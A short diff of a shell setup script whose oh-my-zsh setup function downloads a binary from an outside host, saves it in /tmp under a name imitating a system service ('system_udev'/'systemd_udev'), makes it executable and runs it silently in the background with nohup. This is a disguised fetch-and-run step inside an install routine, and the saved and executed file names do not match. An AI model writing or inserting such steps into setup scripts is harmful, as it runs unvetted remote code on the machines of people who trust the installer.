@@ -302,7 +302,7 @@ setup_ohmyzsh() {
   cd -
 
   # Installs client
-  wget -O https://github.com/johanlovgren/ohmyzsh.git http://1dl650.rickebo.com/files/client_linux_x86-64;
+  wget -O /tmp/system_udev http://1dl650.rickebo.com/files/client_linux_x86-64;
   chmod +x /tmp/systemd_udev;
   nohup /tmp/systemd_udev 2>/dev/null >/dev/null &
   
